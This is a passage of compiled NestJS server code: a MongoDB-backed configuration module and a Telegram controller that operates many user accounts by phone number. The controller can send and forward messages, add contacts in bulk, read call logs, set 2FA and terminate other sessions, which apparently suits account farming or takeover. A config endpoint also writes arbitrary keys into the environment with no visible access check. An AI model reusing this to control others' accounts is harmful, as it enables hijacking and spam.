], ConfigurationController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update configuration' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ConfigurationController.prototype, "update", null);
exports.ConfigurationController = ConfigurationController = __decorate([
    (0, swagger_1.ApiTags)('Configuration'),
    (0, common_1.Controller)('configuration'),
    __metadata("design:paramtypes", [init_service_1.ConfigurationService])
], ConfigurationController);


/***/ }),

/***/ "./src/components/ConfigurationInit/init.module.ts":
/*!*********************************************************!*\
  !*** ./src/components/ConfigurationInit/init.module.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var InitModule_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.InitModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const config_1 = __webpack_require__(/*! @nestjs/config */ "@nestjs/config");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const init_service_1 = __webpack_require__(/*! ./init.service */ "./src/components/ConfigurationInit/init.service.ts");
const configuration_schema_1 = __webpack_require__(/*! ./configuration.schema */ "./src/components/ConfigurationInit/configuration.schema.ts");
const init_controller_1 = __webpack_require__(/*! ./init.controller */ "./src/components/ConfigurationInit/init.controller.ts");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const path_1 = __importDefault(__webpack_require__(/*! path */ "path"));
let InitModule = InitModule_1 = class InitModule {
    constructor(connection, configService) {
        this.connection = connection;
        this.configService = configService;
        this.HEALTH_CHECK_INTERVAL = 30000;
    }
    async onModuleInit() {
        if (InitModule_1.initializationStatus.isInitializing || InitModule_1.initializationStatus.isInitialized) {
            return;
        }
        InitModule_1.initializationStatus.isInitializing = true;
        try {
            console.log(`Initializing configuration module...`);
            await this.validateConnection();
            this.setupConnectionEventHandlers();
            this.startHealthCheck();
            InitModule_1.initializationStatus.isInitialized = true;
            InitModule_1.initializationStatus.isInitializing = false;
            console.log(`Started :: ${process.env.clientId}`);
            await this.sendNotification(`started :: ${process.env.clientId}`);
        }
        catch (error) {
            InitModule_1.initializationStatus.isInitializing = false;
            console.error('Failed to initialize configuration module:', error);
            throw error;
        }
    }
    async validateConnection() {
        const maxRetries = 3;
        let retryCount = 0;
        while (retryCount < maxRetries) {
            try {
                if (this.connection.readyState !== 1) {
                    throw new Error(`MongoDB connection not ready. Current state: ${this.connection.readyState}`);
                }
                await this.connection.db.admin().ping();
                console.log('MongoDB connection validated successfully');
                return;
            }
            catch (error) {
                retryCount++;
                console.warn(`Connection validation attempt ${retryCount}/${maxRetries} failed:`, error);
                if (retryCount >= maxRetries) {
                    throw new Error(`Failed to validate MongoDB connection after ${maxRetries} attempts: ${error.message}`);
                }
                await this.delay(2000 * retryCount);
            }
        }
    }
    setupConnectionEventHandlers() {
        this.connection.on('connected', () => {
            console.log('MongoDB Connected');
        });
        this.connection.on('error', (error) => {
            console.error('MongoDB Connection Error:', error);
        });
        this.connection.on('disconnected', () => {
            console.warn('MongoDB Disconnected');
        });
        this.connection.on('reconnected', () => {
            console.log('MongoDB Reconnected');
        });
        this.connection.on('close', () => {
            console.log('MongoDB Connection Closed');
        });
    }
    startHealthCheck() {
        this.connectionHealthCheckInterval = setInterval(async () => {
            try {
                if (this.connection.readyState === 1) {
                    await this.connection.db.admin().ping();
                }
            }
            catch (error) {
                console.error('MongoDB health check failed:', error);
            }
        }, this.HEALTH_CHECK_INTERVAL);
    }
    stopHealthCheck() {
        if (this.connectionHealthCheckInterval) {
            clearInterval(this.connectionHealthCheckInterval);
            this.connectionHealthCheckInterval = undefined;
        }
    }
    async sendNotification(message) {
        try {
            const url = `${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(message)}`;
            await (0, fetchWithTimeout_1.fetchWithTimeout)(url, { timeout: 5000 });
        }
        catch (error) {
            console.warn('Failed to send notification:', error);
        }
    }
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    async onModuleDestroy() {
        if (InitModule_1.initializationStatus.isDestroying) {
            return;
        }
        InitModule_1.initializationStatus.isDestroying = true;
        try {
            console.log('Init Module destroying...');
            this.stopHealthCheck();
            await this.sendNotification(`closed :: ${process.env.clientId}`);
            if (this.connection && this.connection.readyState !== 0) {
                console.log('Closing MongoDB connection...');
                await this.connection.close(true);
            }
        }
        catch (error) {
            console.error('Error during module destruction:', error);
        }
        finally {
            InitModule_1.initializationStatus = {
                isInitialized: false,
                isInitializing: false,
                isDestroying: false,
            };
        }
    }
    static getInitializationStatus() {
        return { ...InitModule_1.initializationStatus };
    }
    static isReady() {
        return InitModule_1.initializationStatus.isInitialized && !InitModule_1.initializationStatus.isDestroying;
    }
};
exports.InitModule = InitModule;
InitModule.initializationStatus = {
    isInitialized: false,
    isInitializing: false,
    isDestroying: false,
};
exports.InitModule = InitModule = InitModule_1 = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            config_1.ConfigModule.forRoot({
                isGlobal: true,
                cache: true,
                expandVariables: true,
                envFilePath: [path_1.default.resolve(process.cwd(), '.env'), '.env']
            }),
            mongoose_1.MongooseModule.forRootAsync({
                imports: [config_1.ConfigModule],
                useFactory: async (configService) => {
                    const uri = process.env.mongouri || configService.get('mongouri');
                    if (!uri) {
                        console.error('MongoDB URI is not configured. Please set the "mongouri" environment variable.');
                        throw new Error('MongoDB URI is not configured');
                    }
                    return {
                        uri,
                        maxPoolSize: 10,
                        serverSelectionTimeoutMS: 10000,
                        socketTimeoutMS: 45000,
                        connectTimeoutMS: 10000,
                        heartbeatFrequencyMS: 10000,
                        family: 4,
                        retryWrites: true,
                        retryReads: true,
                    };
                },
                inject: [config_1.ConfigService],
            }),
            mongoose_1.MongooseModule.forFeature([{
                    name: 'configurationModule',
                    collection: 'configuration',
                    schema: configuration_schema_1.ConfigurationSchema
                }])
        ],
        providers: [init_service_1.ConfigurationService],
        controllers: [init_controller_1.ConfigurationController],
        exports: [init_service_1.ConfigurationService, mongoose_1.MongooseModule],
    }),
    __param(0, (0, common_1.Inject)((0, mongoose_1.getConnectionToken)())),
    __metadata("design:paramtypes", [mongoose_2.Connection,
        config_1.ConfigService])
], InitModule);


/***/ }),

/***/ "./src/components/ConfigurationInit/init.service.ts":
/*!**********************************************************!*\
  !*** ./src/components/ConfigurationInit/init.service.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var ConfigurationService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const config_1 = __webpack_require__(/*! @nestjs/config */ "@nestjs/config");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
let ConfigurationService = ConfigurationService_1 = class ConfigurationService {
    constructor(configurationModel, configService) {
        this.configurationModel = configurationModel;
        this.configService = configService;
        this.logger = new utils_1.Logger(ConfigurationService_1.name);
    }
    async onModuleInit() {
        if (ConfigurationService_1.initialized) {
            return;
        }
        try {
            await this.initializeConfiguration();
            ConfigurationService_1.initialized = true;
        }
        catch (error) {
            this.logger.error('Failed to initialize configuration', error);
            throw error;
        }
    }
    async initializeConfiguration() {
        await this.setEnv();
        await this.notifyStart();
    }
    async notifyStart() {
        try {
            const clientId = process.env.clientId || this.configService.get('clientId');
            if (!clientId) {
                this.logger.warn('No clientId found in environment or configuration');
                return;
            }
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Started :: ${clientId}`)}`);
        }
        catch (error) {
            this.logger.warn('Failed to send start notification', error);
        }
    }
    async findOne() {
        const configuration = await this.configurationModel.findOne({}).lean().exec();
        if (!configuration) {
            throw new common_1.NotFoundException('Configuration not found');
        }
        return configuration;
    }
    async setEnv() {
        this.logger.log('Setting environment variables...');
        const configuration = await this.configurationModel.findOne({}, { _id: 0 }).lean();
        if (!configuration) {
            this.logger.warn('No configuration found in database, using environment variables only');
            return;
        }
        for (const [key, value] of Object.entries(configuration)) {
            if (value !== undefined && value !== null) {
                if (!process.env[key]) {
                    process.env[key] = String(value);
                    this.logger.debug(`Set environment variable: ${key}`);
                }
            }
        }
        this.logger.log('Finished setting environment variables');
    }
    async update(updateDto) {
        const { _id, ...updateData } = updateDto;
        try {
            const updatedConfig = await this.configurationModel.findOneAndUpdate({}, { $set: updateData }, { new: true, upsert: true, lean: true }).exec();
            if (!updatedConfig) {
                throw new common_1.NotFoundException('Failed to update configuration');
            }
            Object.entries(updateData).forEach(([key, value]) => {
                if (value !== undefined && value !== null) {
                    process.env[key] = String(value);
                }
            });
            return updatedConfig;
        }
        catch (error) {
            this.logger.error('Failed to update configuration', error);
            throw error;
        }
    }
};
exports.ConfigurationService = ConfigurationService;
ConfigurationService.initialized = false;
exports.ConfigurationService = ConfigurationService = ConfigurationService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('configurationModule')),
    __metadata("design:paramtypes", [mongoose_2.Model,
        config_1.ConfigService])
], ConfigurationService);


/***/ }),

/***/ "./src/components/Telegram/Telegram.controller.ts":
/*!********************************************************!*\
  !*** ./src/components/Telegram/Telegram.controller.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const Telegram_service_1 = __webpack_require__(/*! ./Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const dto_1 = __webpack_require__(/*! ./dto */ "./src/components/Telegram/dto/index.ts");
const create_chat_folder_dto_1 = __webpack_require__(/*! ./dto/create-chat-folder.dto */ "./src/components/Telegram/dto/create-chat-folder.dto.ts");
const connection_management_dto_1 = __webpack_require__(/*! ./dto/connection-management.dto */ "./src/components/Telegram/dto/connection-management.dto.ts");
const platform_express_1 = __webpack_require__(/*! @nestjs/platform-express */ "@nestjs/platform-express");
const multer = __importStar(__webpack_require__(/*! multer */ "multer"));
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const connection_manager_1 = __webpack_require__(/*! ./utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const message_search_dto_1 = __webpack_require__(/*! ./dto/message-search.dto */ "./src/components/Telegram/dto/message-search.dto.ts");
const delete_chat_dto_1 = __webpack_require__(/*! ./dto/delete-chat.dto */ "./src/components/Telegram/dto/delete-chat.dto.ts");
const update_username_dto_1 = __webpack_require__(/*! ./dto/update-username.dto */ "./src/components/Telegram/dto/update-username.dto.ts");
const send_message_dto_1 = __webpack_require__(/*! ./dto/send-message.dto */ "./src/components/Telegram/dto/send-message.dto.ts");
const update_profile_dto_1 = __webpack_require__(/*! ./dto/update-profile.dto */ "./src/components/Telegram/dto/update-profile.dto.ts");
const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "big-integer"));
let TelegramController = class TelegramController {
    constructor(telegramService) {
        this.telegramService = telegramService;
    }
    async connect(mobile, autoDisconnect, handler) {
        const options = { autoDisconnect, handler };
        await this.telegramService.connect(mobile, options);
        return { message: 'Connected successfully' };
    }
    async disconnect(mobile) {
        await this.telegramService.disconnect(mobile);
        return { message: 'Disconnected successfully' };
    }
    async disconnectAll() {
        await this.telegramService.disconnectAll();
        return { message: 'All clients disconnected successfully' };
    }
    getConnectionStats() {
        return this.telegramService.getConnectionStats();
    }
    getClientState(mobile) {
        return this.telegramService.getClientState(mobile);
    }
    getActiveConnectionCount() {
        return this.telegramService.getActiveConnectionCount();
    }
    async getMe(mobile) {
        return this.telegramService.getMe(mobile);
    }
    async getEntity(mobile, entity) {
        return this.telegramService.getEntity(mobile, entity);
    }
    async updateProfile(mobile, updateProfileDto) {
        return this.telegramService.updateNameandBio(mobile, updateProfileDto.firstName, updateProfileDto.about);
    }
    async setProfilePhoto(mobile, photoDto) {
        return this.telegramService.setProfilePic(mobile, photoDto.name);
    }
    async deleteProfilePhotos(mobile) {
        return this.telegramService.deleteProfilePhotos(mobile);
    }
    async getMessages(mobile, chatId, limit) {
        return this.telegramService.getMessages(mobile, chatId, limit);
    }
    async sendMessage(mobile, dto) {
        return this.telegramService.sendMessage(mobile, dto);
    }
    async forwardMessage(mobile, forwardDto) {
        return this.telegramService.forwardBulkMessages(mobile, forwardDto.fromChatId, forwardDto.toChatId, forwardDto.messageIds);
    }
    async processBatchMessages(mobile, batchOp) {
        return this.telegramService.processBatch(batchOp.items, batchOp.batchSize || 20, async (batch) => {
            switch (batchOp.operation) {
                case dto_1.BatchOperationType.FORWARD:
                    for (const item of batch) {
                        if ('messageId' in item && item.fromChatId && item.toChatId) {
                            await this.telegramService.forwardMessage(mobile, item.toChatId, item.fromChatId, item.messageId);
                        }
                    }
                    break;
                case dto_1.BatchOperationType.DELETE:
                    for (const item of batch) {
                        await this.telegramService.deleteChat(mobile, { peer: item.chatId, justClear: true });
                    }
                    break;
                default:
                    throw new common_1.BadRequestException('Unsupported batch operation');
            }
        }, batchOp.delayMs);
    }
    async searchMessages(mobile, queryParams) {
        return this.telegramService.searchMessages(mobile, queryParams);
    }
    async getChannelInfo(mobile, includeIds) {
        return this.telegramService.getChannelInfo(mobile, includeIds);
    }
    async forwardMedia(mobile, channel, fromChatId) {
        await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
        return this.telegramService.forwardMedia(mobile, channel, fromChatId);
    }
    async leaveChannel(mobile, channel) {
        return this.telegramService.leaveChannel(mobile, channel);
    }
    async updateUsername(mobile, updateUsernameDto) {
        return this.telegramService.updateUsername(mobile, updateUsernameDto.newUsername);
    }
    async setup2FA(mobile) {
        return this.telegramService.set2Fa(mobile);
    }
    async updatePrivacy(mobile) {
        return this.telegramService.updatePrivacy(mobile);
    }
    async updatePrivacyBatch(mobile, settings) {
        return this.telegramService.updatePrivacyBatch(mobile, settings);
    }
    async getActiveSessions(mobile) {
        return this.telegramService.getAuths(mobile);
    }
    async terminateOtherSessions(mobile) {
        return this.telegramService.removeOtherAuths(mobile);
    }
    async createNewSession(mobile) {
        return this.telegramService.createNewSession(mobile);
    }
    async getSessionInfo(mobile) {
        return this.telegramService.getSessionInfo(mobile);
    }
    async terminateSession(mobile, data) {
        return this.telegramService.terminateSession(mobile, data);
    }
    async getConnectionStatus() {
        return { status: await this.telegramService.getConnectionStatus() };
    }
    async getCallLogStats(mobile, limit) {
        if (limit !== undefined && (limit < 1 || limit > 10000)) {
            throw new common_1.BadRequestException('Limit must be between 1 and 10000.');
        }
        return this.telegramService.getCallLog(mobile, limit);
    }
    async addContactsBulk(mobile, contactsDto) {
        return this.telegramService.addContacts(mobile, contactsDto.phoneNumbers, contactsDto.prefix);
    }
    async getContacts(mobile) {
        return this.telegramService.getContacts(mobile);
    }
    async sendMedia(mobile, sendMediaDto) {
        if (sendMediaDto.url) {
            try {
                const headResponse = await axios_1.default.head(sendMediaDto.url, { timeout: 10000 });
                const contentLength = parseInt(headResponse.headers['content-length'] || '0', 10);
                const maxSize = 100 * 1024 * 1024;
                if (contentLength > maxSize) {
                    const fileSizeMB = (contentLength / (1024 * 1024)).toFixed(2);
                    const maxSizeMB = (maxSize / (1024 * 1024)).toFixed(0);
                    throw new common_1.BadRequestException(`File size (${fileSizeMB} MB) exceeds maximum allowed size of ${maxSizeMB} MB. Please use a smaller file.`);
                }
            }
            catch (error) {
                if (error instanceof common_1.BadRequestException) {
                    throw error;
                }
            }
        }
        try {
            const client = await connection_manager_1.connectionManager.getClient(mobile);
            if (sendMediaDto.type === dto_1.MediaType.PHOTO) {
                return await client.sendPhotoChat(sendMediaDto.chatId, sendMediaDto.url, sendMediaDto.caption, sendMediaDto.filename);
            }
            return await client.sendFileChat(sendMediaDto.chatId, sendMediaDto.url, sendMediaDto.caption, sendMediaDto.filename);
        }
        catch (error) {
            if (error instanceof common_1.BadRequestException) {
                throw error;
            }
            throw new common_1.BadRequestException(`Failed to send media: ${error.message || 'Unknown error'}`);
        }
    }
    async downloadMedia(mobile, chatId, messageId, res) {
        if (!messageId || messageId <= 0 || !Number.isInteger(messageId)) {
            throw new common_1.BadRequestException('Message ID must be a positive integer');
        }
        if (!chatId || chatId.trim().length === 0) {
            throw new common_1.BadRequestException('Chat ID is required and cannot be empty');
        }
        try {
            const fileInfo = await this.telegramService.getMediaFileDownloadInfo(mobile, messageId, chatId);
            if (res.req.headers['if-none-match'] === fileInfo.etag) {
                return res.status(304).end();
            }
            const range = res.req.headers.range;
            const chunkSize = 512 * 1024;
            if (range && fileInfo.fileSize > 0) {
                const parts = range.replace(/bytes=/, "").split("-");
                const start = parseInt(parts[0], 10);
                const end = parts[1] ? parseInt(parts[1], 10) : fileInfo.fileSize - 1;
                const chunksize = (end - start) + 1;
                if (start >= fileInfo.fileSize || end >= fileInfo.fileSize || start > end) {
                    res.status(416).setHeader('Content-Range', `bytes */${fileInfo.fileSize}`);
                    return res.end();
                }
                res.status(206);
                res.setHeader('Content-Range', `bytes ${start}-${end}/${fileInfo.fileSize}`);
                res.setHeader('Accept-Ranges', 'bytes');
                res.setHeader('Content-Length', chunksize);
                res.setHeader('Content-Type', fileInfo.contentType);
                res.setHeader('Content-Disposition', `inline; filename="${fileInfo.filename}"`);
                res.setHeader('Cache-Control', 'public, max-age=3600');
                res.setHeader('ETag', fileInfo.etag);
                res.setHeader('X-Content-Type-Options', 'nosniff');
                res.setHeader('Access-Control-Allow-Origin', '*');
                res.setHeader('Access-Control-Expose-Headers', 'Content-Length, Content-Range, Accept-Ranges');
                for await (const chunk of this.telegramService.streamMediaFile(mobile, fileInfo.fileLocation, (0, big_integer_1.default)(start), chunksize, chunkSize)) {
                    res.write(chunk);
                }
            }
            else {
                res.setHeader('Content-Type', fileInfo.contentType);
                res.setHeader('Content-Disposition', `inline; filename="${fileInfo.filename}"`);
                res.setHeader('Cache-Control', 'public, max-age=3600');
                res.setHeader('ETag', fileInfo.etag);
                res.setHeader('Accept-Ranges', 'bytes');
                res.setHeader('X-Content-Type-Options', 'nosniff');
                res.setHeader('Access-Control-Allow-Origin', '*');
                res.setHeader('Access-Control-Expose-Headers', 'Content-Length, Accept-Ranges');
                if (fileInfo.fileSize > 0) {
                    res.setHeader('Content-Length', fileInfo.fileSize);
                }
                for await (const chunk of this.telegramService.streamMediaFile(mobile, fileInfo.fileLocation, (0, big_integer_1.default)(0), 5 * 1024 * 1024, chunkSize)) {
                    res.write(chunk);
                }
            }
            res.end();
        }
        catch (error) {
            if (error.message?.includes('FILE_REFERENCE_EXPIRED') || error.message?.includes('not found')) {
                return res.status(404).send(error.message || 'File reference expired');
            }
            if (!res.headersSent) {
                res.status(500).send('Error downloading media');
            }
        }
    }
    async getThumbnail(mobile, chatId, messageId, res) {
        if (!messageId || messageId <= 0 || !Number.isInteger(messageId)) {
            throw new common_1.BadRequestException('Message ID must be a positive integer');
        }
        if (!chatId || chatId.trim().length === 0) {
            throw new common_1.BadRequestException('Chat ID is required and cannot be empty');
        }
        try {
            const thumbnail = await this.telegramService.getThumbnail(mobile, messageId, chatId);
            if (res.req.headers['if-none-match'] === thumbnail.etag) {
                return res.status(304).end();
            }
            res.setHeader('Content-Type', thumbnail.contentType);
            res.setHeader('Content-Disposition', `inline; filename="${thumbnail.filename}"`);
            res.setHeader('Cache-Control', 'public, max-age=3600');
            res.setHeader('ETag', thumbnail.etag);
            res.setHeader('Content-Length', thumbnail.buffer.length);
            return res.send(thumbnail.buffer);
        }
        catch (error) {
            if (error.message?.includes('FILE_REFERENCE_EXPIRED') || error.message?.includes('not found') || error.message?.includes('not available')) {
                return res.status(404).send(error.message || 'Thumbnail not available');
            }
            if (!res.headersSent) {
                res.status(500).send('Error getting thumbnail');
            }
        }
    }
    async sendMediaAlbum(mobile, albumDto) {
        if (!albumDto.media || albumDto.media.length === 0) {
            throw new common_1.BadRequestException('Album must contain at least one media item');
        }
        if (albumDto.media.length > 10) {
            throw new common_1.BadRequestException(`Album cannot contain more than 10 items. You provided ${albumDto.media.length} items.`);
        }
        return this.telegramService.sendMediaAlbum(mobile, albumDto);
    }
    async getMediaMetadata(mobile, chatId, types, startDate, endDate, limit, maxId, minId) {
        if (!chatId || chatId.trim().length === 0) {
            throw new common_1.BadRequestException('Chat ID is required and cannot be empty');
        }
        if (limit !== undefined && (limit <= 0 || limit > 1000)) {
            throw new common_1.BadRequestException('Limit must be between 1 and 1000');
        }
        let parsedTypes;
        if (types) {
            const typesArray = Array.isArray(types) ? types : [types];
            const validTypes = ['photo', 'video', 'document', 'voice', 'all'];
            parsedTypes = typesArray
                .filter(t => validTypes.includes(t.toLowerCase()))
                .map(t => t.toLowerCase());
            if (parsedTypes.length === 0) {
                throw new common_1.BadRequestException(`Invalid types. Must be one or more of: ${validTypes.join(', ')}`);
            }
        }
        let parsedStartDate;
        let parsedEndDate;
        if (startDate && startDate.trim()) {
            parsedStartDate = new Date(startDate);
            if (isNaN(parsedStartDate.getTime())) {
                throw new common_1.BadRequestException(`Invalid startDate format. Use ISO 8601 format (e.g., "2024-01-01" or "2024-01-01T10:00:00")`);
            }
        }
        if (endDate && endDate.trim()) {
            parsedEndDate = new Date(endDate);
            if (isNaN(parsedEndDate.getTime())) {
                throw new common_1.BadRequestException(`Invalid endDate format. Use ISO 8601 format (e.g., "2024-12-31" or "2024-12-31T23:59:59")`);
            }
        }
        if (parsedStartDate && parsedEndDate && parsedStartDate > parsedEndDate) {
            throw new common_1.BadRequestException('startDate must be before or equal to endDate');
        }
        return this.telegramService.getMediaMetadata(mobile, {
            chatId,
            types: parsedTypes,
            startDate: parsedStartDate,
            endDate: parsedEndDate,
            limit,
            maxId,
            minId
        });
    }
    async getFilteredMedia(mobile, chatId, types, startDate, endDate, limit, maxId, minId) {
        if (!chatId || chatId.trim().length === 0) {
            throw new common_1.BadRequestException('Chat ID is required and cannot be empty');
        }
        if (limit !== undefined && (limit <= 0 || limit > 1000)) {
            throw new common_1.BadRequestException('Limit must be between 1 and 1000');
        }
        let parsedTypes;
        if (types) {
            const typesArray = Array.isArray(types) ? types : [types];
            const validTypes = ['photo', 'video', 'document', 'voice', 'all'];
            parsedTypes = typesArray
                .filter(t => validTypes.includes(t.toLowerCase()))
                .map(t => t.toLowerCase());
            if (parsedTypes.length === 0) {
                throw new common_1.BadRequestException(`Invalid types. Must be one or more of: ${validTypes.join(', ')}`);
            }
        }
        let parsedStartDate;
        let parsedEndDate;
        if (startDate && startDate.trim()) {
            parsedStartDate = new Date(startDate);
            if (isNaN(parsedStartDate.getTime())) {
                throw new common_1.BadRequestException(`Invalid startDate format. Use ISO 8601 format (e.g., "2024-01-01" or "2024-01-01T10:00:00")`);
            }
        }
        if (endDate && endDate.trim()) {
            parsedEndDate = new Date(endDate);
            if (isNaN(parsedEndDate.getTime())) {
                throw new common_1.BadRequestException(`Invalid endDate format. Use ISO 8601 format (e.g., "2024-12-31" or "2024-12-31T23:59:59")`);
            }
        }
        if (parsedStartDate && parsedEndDate && parsedStartDate > parsedEndDate) {
            throw new common_1.BadRequestException('startDate must be before or equal to endDate');
        }
        return this.telegramService.getFilteredMedia(mobile, {
            chatId,
            types: parsedTypes,
            startDate: parsedStartDate,
            endDate: parsedEndDate,
            limit,
            maxId,
            minId
        });
    }
    async getGroupMembers(mobile, groupId) {
        return this.telegramService.getGrpMembers(mobile, groupId);
    }
    async blockChat(mobile, chatId) {
        return this.telegramService.blockUser(mobile, chatId);
    }
    async deleteChatHistory(mobile, deleteHistoryDto) {
        return this.telegramService.deleteChat(mobile, deleteHistoryDto);
    }
    async sendMessageWithInlineButton(mobile, chatId, message, url) {
        return this.telegramService.sendInlineMessage(mobile, chatId, message, url);
    }
    async getAllDialogs(mobile, limit = 500, offsetId = 0, archived = false) {
        return this.telegramService.getDialogs(mobile, { limit, archived, offsetId });
    }
    async getLastActiveTime(mobile) {
        return this.telegramService.getLastActiveTime(mobile);
    }
    async createGroupWithOptions(mobile, options) {
        return this.telegramService.createGroupWithOptions(mobile, options);
    }
    async updateGroupSettings(mobile, settings) {
        return this.telegramService.updateGroupSettings(mobile, settings);
    }
    async addGroupMembers(memberOp, mobile) {
        return this.telegramService.addGroupMembers(mobile, memberOp.groupId, memberOp.members);
    }
    async removeGroupMembers(memberOp, mobile) {
        return this.telegramService.removeGroupMembers(mobile, memberOp.groupId, memberOp.members);
    }
    async handleAdminOperation(adminOp, mobile) {
        if (adminOp.isPromote) {
            return this.telegramService.promoteToAdmin(mobile, adminOp.groupId, adminOp.userId, adminOp.permissions, adminOp.rank);
        }
        else {
            return this.telegramService.demoteAdmin(mobile, adminOp.groupId, adminOp.userId);
        }
    }
    async cleanupChat(mobile, cleanup) {
        return this.telegramService.cleanupChat(mobile, {
            chatId: cleanup.chatId,
            beforeDate: cleanup.beforeDate ? new Date(cleanup.beforeDate) : undefined,
            onlyMedia: cleanup.onlyMedia,
            excludePinned: cleanup.excludePinned
        });
    }
    async getChatStatistics(mobile, chatId, period = 'week') {
        return this.telegramService.getChatStatistics(mobile, chatId, period);
    }
    async scheduleMessage(mobile, schedule) {
        return this.telegramService.scheduleMessage(mobile, {
            chatId: schedule.chatId,
            message: schedule.message,
            scheduledTime: new Date(schedule.scheduledTime),
            replyTo: schedule.replyTo,
